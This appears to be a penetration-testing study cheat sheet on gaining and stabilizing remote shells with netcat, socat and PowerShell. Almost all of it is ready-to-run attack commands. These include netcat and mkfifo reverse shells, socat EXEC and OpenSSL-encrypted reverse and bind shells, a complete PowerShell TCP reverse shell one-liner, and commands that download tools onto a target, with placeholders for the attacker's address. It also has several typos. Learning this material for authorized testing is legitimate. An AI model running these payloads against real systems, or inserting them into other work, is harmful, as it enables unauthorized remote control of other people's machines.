Network tools:

netcat					swiss-army-knife of networking tools
socat					like netcat on at but installed on very few systems
metasploit auxiliary/multi/handler	keep track of sessions. only way to use meterpreter
msfvenom				standalone create payloads on the fly

netcat reverse shell:
	On the attacking machine:
		sudo nc -lvnp <port>
	On the target:
		nc <LOCAL-IP> <PORT> -e /bin/bash
Bind shell example:
	On the target:
		nc -lvnp <port> -e "cmd.exe"
	On the attacking machine:
		nc MACHINE_IP <port>
starting a listener:
	nc -lvnp <port-number>
bind shells:
	nc <target-ip> <chosen-port>

netcat shell stabilization:
	technique 1) Python
		python -c 'import pty;pty.spawn("/bin/bash")'
		*may require starting off with python2 or python3
		export TERM=xterm
		stty raw -echo; fg

	technique 2) rlwrap
		not on Kali by default (sudo apt install rlwrap)
		rlwrap nc -lvnp <port>
		ctrl+z 		to background the shell
		stty raw -echo; fg

	technique 3) socat
		limited to Linux targets
		webserver on attacking machine		sudo python3 -m http.server <port>
		on target machine			wget <LOCAL-IP>/socat -O /tmp/socat
		in windows w/ powershell		Invoke-WebRequest -uri <LOCAL_IP>/socat.exe							   -outfile C:\\Windows\temp\socat.exe
	Adjusting tty size
		open a second terminal on attack machine and run: stty -a
		note rows and column size
		in the reverse/bindshell: stty rows <number>
					  stty cols <number>

Socat
	Reverse Shells
		for basic reverse shell listener:
		socat TCP-L:<port> -		
		on windows to connect back:
		socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
			pipes option allows for standard UNIX style input & output
		
		equivalent on Linux:
		socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

	Bind Shells
		Set a listener on a Linux target:
		socat TCP-L:<PORT> EXEC:"bash -li"
		
		Set a listener on a Windows target:
		socat TCP-L:<PORT> EXEC:powershell.exe,pipes
		
		On attacking machine regardless of the target:
		isocat TCP:<TARGET-IP>:<TARGET-PORT> -
	
	Powerful uses - a fully stable Linux tty reverse shell
		socat TCP-L:<port> FILE:'tty',raw,echo=0
		this listener can be connected to with any payload

	second model - requires socat is installed on target machine:
	socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li",pty/stderr/sigint/setsid/sane
		pty - allocates a pseudoterminal on the target
		stderr - makes sure that any error messages get shown in the shell
		sigint - passes any CTL+C commands tthrough in the the sub-process
		setsid - creates the process in a new session
		sane - stabilises the terminal, attempting to "normalise" it


Socat encrypted shells
	From previous examples TCP should be replaced with OPENSSL
	First need to generate a certificate in order to use encrypted shells

	For a reverse shell:

	On the attacking machine:
	openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
	the output of which is two files which need to be merged into a single .pem file
	cat shell.key shell.crt > shell.pem	
	
	Then for reverse shell listener use:
	socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0
	
	The certificate must be usedo n whichever device is listening
	
	To connect back we use:
	socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash


	For a blind shell:
	
	target:
	socat OPENSSL-LISTEN:<PORT>,cert=shell.pen,verify=0 EXEC:cmd.exe,pipes
	
	attacker:
	socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

			
Common Shell Payloads
as a listener:
	nc -lvnp <PORT> -e /bin/bash
	connecting to the above would result in a bind shell on the target
for a reverse shell, connect back with:
	for windows:
	nc <LOCAL-IP> <PORT> -e /bin/bash

	on Linux:
	mkfifo [option] <name>		to create a named pipe
	the command:
	mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh>/tmp/f 2>&1; rm /tmp/f
to send a netcat reverse shell on linux:
	mkfifo /tmp/f; nc <local-ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

in powershell send a reverse shell to the attacker's nc listener:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



RESOURCES:

Payloads all things shells:
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

PentestMonkey's reverse shells cheathseet:
	https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Seclists repo:
	https://github.com/danielmiessler/SecLists

